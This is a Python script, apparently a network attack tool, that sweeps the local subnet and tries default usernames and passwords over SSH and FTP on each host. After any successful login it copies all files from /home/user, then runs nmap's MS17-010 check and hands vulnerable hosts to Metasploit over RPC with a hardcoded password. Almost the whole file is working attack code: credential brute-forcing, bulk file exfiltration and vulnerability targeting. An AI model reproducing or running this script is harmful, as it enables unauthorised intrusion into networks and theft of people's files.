import os
import logging
import socket
import ipaddress
import scapy.all as scapy
import paramiko
import ftplib
import subprocess
import xml.etree.ElementTree as ET
from pymetasploit3.msfrpc import MsfRpcClient
from typing import List
import tempfile

# Use tempfile to create a log file in a safe location
log_file_name = os.path.join(tempfile.gettempdir(), 'network_scanner.log')

# Setup logging
logging.basicConfig(filename=log_file_name, level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Also log to the console
console_handler = logging.StreamHandler()
console_handler.setLevel(logging.INFO)
formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
console_handler.setFormatter(formatter)
logging.getLogger().addHandler(console_handler)


def get_local_ip_range() -> str:
    """Get the local IP address and return the corresponding CIDR range."""
    hostname = socket.gethostname()
    local_ip = socket.gethostbyname(hostname)
    network = ipaddress.ip_network(
        local_ip + '/24', strict=False)  # Assuming a /24 subnet
    logging.info(f"Local IP range determined: {network}")
    return str(network)


def scan_network(ip_range: str) -> List[str]:
    """Scan the network and return a list of active IPs."""
    arp_request = scapy.ARP(pdst=ip_range)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]

    active_ips = [element[1].psrc for element in answered_list]
    logging.info(f"Active IPs found: {active_ips}")
    return active_ips


def ssh_file_extraction(ip: str, username: str, password: str, remote_path: str):
    """Extract files over SSH."""
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(ip, username=username, password=password)

        stdin, stdout, stderr = client.exec_command(f'ls {remote_path}')
        files = stdout.read().decode().splitlines()

        for file in files:
            local_file_path = os.path.join(os.getcwd(), file)
            sftp = client.open_sftp()
            sftp.get(os.path.join(remote_path, file), local_file_path)
            logging.info(f'Downloaded {file} from {ip}')
            sftp.close()

        client.close()
    except Exception as e:
        logging.error(f"SSH Error on {ip}: {e}")


def ftp_file_extraction(ip: str, username: str, password: str, remote_path: str):
    """Extract files over FTP."""
    try:
        with ftplib.FTP(ip) as ftp:
            ftp.login(user=username, passwd=password)
            ftp.cwd(remote_path)
            files = ftp.nlst()

            for file in files:
                local_file_path = os.path.join(os.getcwd(), file)
                with open(local_file_path, 'wb') as f:
                    ftp.retrbinary(f'RETR {file}', f.write)
                    logging.info(f'Downloaded {file} from {ip}')
    except Exception as e:
        logging.error(f"FTP Error on {ip}: {e}")


def attempt_connections(ip: str, username_list: List[str], password_list: List[str]):
    """Attempt connections using provided username and password lists."""
    remote_path = '/home/user'  # Adjust according to your needs

    for username in username_list:
        for password in password_list:
            try:
                logging.info(
                    f"Attempting SSH on {ip} with {username}:{password}")
                ssh_file_extraction(ip, username, password, remote_path)

                logging.info(
                    f"Attempting FTP on {ip} with {username}:{password}")
                ftp_file_extraction(ip, username, password, remote_path)
            except Exception as e:
                logging.error(
                    f"Connection error on {ip} with {username}:{password} - {e}")


def nmap_vuln_ms17_010(xml_string):
    """Check if MS17-010 is vulnerable."""
    try:
        root = ET.fromstring(xml_string)
        for host in root.findall('.//host'):
            for hostscript in host.findall('.//hostscript'):
                for script in hostscript.findall('.//script'):
                    for elem in script.findall('.//elem[@key="state"]'):
                        if elem.text == "VULNERABLE":
                            address = host.find(
                                './/address[@addrtype="ipv4"]').attrib['addr']
                            logging.info(
                                "Vulnerable host address: %s", address)
                            return address
        logging.info("Host is not vulnerable")
    except Exception as e:
        logging.error("Error checking vulnerability: %s", e)
    return None


def msf_vuln_ms17_010(vuln_ms17_010_addr):
    """Run MS17-010 exploit in Metasploit."""
    try:
        client = MsfRpcClient('P@$$w0rd', port=55552)
        scan = client.modules.use('auxiliary', "scanner/smb/smb_ms17_010")
        scan['RHOSTS'] = vuln_ms17_010_addr
        scan['VERBOSE'] = True
        cid = client.consoles.console().cid
        logging.info('Console ID: ' + cid)
        output = client.consoles.console(cid).run_module_with_output(scan)
        logging.info(output)
    except Exception as e:
        logging.error('Exception while running Metasploit: %s', e)


def main():
    # Log the start of the program
    logging.info("Starting network scan...")

    # Automatically determine the IP range
    ip_range = get_local_ip_range()
    username_list = ['user', 'admin', 'test']  # Unique username list
    password_list = ['password123', 'admin123', 'letmein']  # Unique password list

    active_ips = scan_network(ip_range)

    # Log if no active IPs are found
    if not active_ips:
        logging.warning("No active IPs found in the network.")
        print("No active IPs found.")
        return

    # Loop through each active IP and attempt file extraction
    for ip in active_ips:
        logging.info(f"Attempting connections on {ip}...")
        attempt_connections(ip, username_list, password_list)

        # Run Nmap vulnerability scan on a predefined script and port
        target_ip = ip
        target_port = "445"  # Common SMB port
        script = "smb-vuln-ms17-010"  # Nmap script for MS17-010

        nmap_command = f"nmap -p {target_port} --script={script} {target_ip} -oX output.xml"
        subprocess.run(nmap_command, shell=True)

        with open('output.xml', 'r') as f:
            xml_string = f.read()
            vulnerable_host = nmap_vuln_ms17_010(xml_string)
            if vulnerable_host:
                msf_vuln_ms17_010(vulnerable_host)

    # Log the completion of the program
    logging.info("Network scan completed.")
    print(f"Log file created at: {log_file_name}")


if __name__ == "__main__":
    main()
